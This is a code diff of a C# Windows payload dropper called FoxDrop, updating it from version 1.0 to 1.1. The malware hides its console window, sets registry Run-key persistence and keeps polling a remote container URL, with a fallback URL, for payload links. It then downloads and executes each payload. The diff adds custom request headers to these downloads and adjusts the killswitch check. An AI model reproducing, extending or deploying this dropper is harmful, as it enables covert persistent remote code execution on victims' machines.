@@ -4,6 +4,8 @@ using System.Diagnostics;
 using System.Net;
 using System.Reflection;
 using System.Runtime.InteropServices;
+using System.Runtime.InteropServices.ComTypes;
+using System.Runtime.Remoting.Messaging;
 using System.Text;
 using System.Threading;
 using static System.Net.Mime.MediaTypeNames;
@@ -37,12 +39,12 @@ namespace FoxDrop
                     Variables.debugLog("[+] Added run policy for persistance on system reboot.");
                     c.SetValue(Variables.registryFolderName, Assembly.GetExecutingAssembly().Location);
                 }
-            } 
+            }
             catch { }
         }
         protected static void DropperCycle()
         {
-            while(true)
+            while (true)
             {
                 try
                 {
@@ -79,10 +81,30 @@ namespace FoxDrop
                     }
 
                     // Read the payload's download link
-                    string payloadDownloadLink = new WebClient().DownloadString(Variables.BEACON_DOWNLOAD_CONTAINER_URL);
+                    string payloadDownloadLink = "";
+
                     Variables.debugLog($"[*] Reading content from \"{Variables.BEACON_DOWNLOAD_CONTAINER_URL}\".");
 
-                    if(!payloadDownloadLink.Contains(Variables.BEACON_FALLBACK_KILLSWITCH_STRING)) 
+                    // Download the payload from the link to the folder.
+                    using (WebClient client = new WebClient())
+                    {
+                        // Adding custom headers
+                        foreach (string header in Variables.BEACON_CONTAINER_REQUEST_AND_DOWNLOAD_HEADERS)
+                        {
+                            string[] headerParts = header.Split(':');
+                            if (headerParts.Length == 2)
+                            {
+                                client.Headers.Add(headerParts[0], headerParts[1]);
+                                Variables.debugLog($"[*] Added custom header \"{header}\" to request");
+                            }
+                        }
+
+                        // Downloading the file
+                        payloadDownloadLink = client.DownloadString(Variables.BEACON_DOWNLOAD_CONTAINER_URL);
+                    }
+
+
+                    if (!payloadDownloadLink.Contains(Variables.BEACON_FALLBACK_KILLSWITCH_STRING))
                     {
                         Variables.debugLog($"[*] String value not found, switching to fallback url \"{Variables.BEACON_DOWNLOAD_CONTAINER_URL_FALLBACK}\".");
                         payloadDownloadLink = new WebClient().DownloadString(Variables.BEACON_DOWNLOAD_CONTAINER_URL_FALLBACK);
@@ -94,7 +116,7 @@ namespace FoxDrop
                     // Iterate throughout each link individually.
                     foreach (string payloadLink in payloadLinks)
                     {
-                        if (String.IsNullOrEmpty(payloadLink) || payloadLink == Variables.BEACON_FALLBACK_KILLSWITCH_STRING)
+                        if (String.IsNullOrEmpty(payloadLink) || payloadLink.Contains(Variables.BEACON_FALLBACK_KILLSWITCH_STRING))
                             continue;
 
                         string LinkAndFileName = payloadLink;
@@ -119,7 +141,22 @@ namespace FoxDrop
                                 Variables.debugLog($"[*] Downloading & executing payload from \"{LinkAndFileName.Split(';')[0]}\"");
 
                                 // Download the payload from the link to the folder.
-                                new WebClient().DownloadFile(LinkAndFileName.Split(';')[0], LinkAndFileName.Split(';')[1]);
+                                using (WebClient client = new WebClient())
+                                {
+                                    // Adding custom headers
+                                    foreach (string header in Variables.BEACON_CONTAINER_REQUEST_AND_DOWNLOAD_HEADERS)
+                                    {
+                                        string[] headerParts = header.Split(':');
+                                        if (headerParts.Length == 2)
+                                        {
+                                            client.Headers.Add(headerParts[0], headerParts[1]);
+                                            Variables.debugLog($"[*] Added custom header \"{header}\" to request");
+                                        }
+                                    }
+
+                                    // Downloading the file
+                                    client.DownloadFile(LinkAndFileName.Split(';')[0], LinkAndFileName.Split(';')[1]);
+                                }
                                 Variables.debugLog($"[*] Downloaded payload to {LinkAndFileName.Split(';')[1]}");
 
                                 // Execute the payload as a process.
@@ -154,14 +191,14 @@ namespace FoxDrop
             //     /_/    \____/_/|_/_____/_/   \____/ .___/       //
             //      by Luigi Fiore aka lypd0        /_/            //
             //                                                     //
-            //             New-Gen Payload Dropper 1.0             //
+            //             New-Gen Payload Dropper 1.1             //
             //                 for Windows Systems                 //
             //                                                     //
             /////////////////////////////////////////////////////////
             */
 
             // Start variable troubleshooting checks
-            if(Variables.TROUBLESHOOTING_CHECKS_ENABLED)
+            if (Variables.TROUBLESHOOTING_CHECKS_ENABLED)
             {
                 Variables.variablesTroubleshooting();
                 return;
@@ -169,14 +206,14 @@ namespace FoxDrop
 
             var handle = GetConsoleWindow();
 
-            if(!Variables.DEBUG_VIEW) 
+            if (!Variables.DEBUG_VIEW)
                 ShowWindow(handle, SW_HIDE);
 
             // Setup Persistance
             SetStartup();
 
             // Start Dropper Thread
-            new Thread(() => { DropperCycle(); }).Start(); 
+            new Thread(() => { DropperCycle(); }).Start();
             Console.ReadLine();
 
 
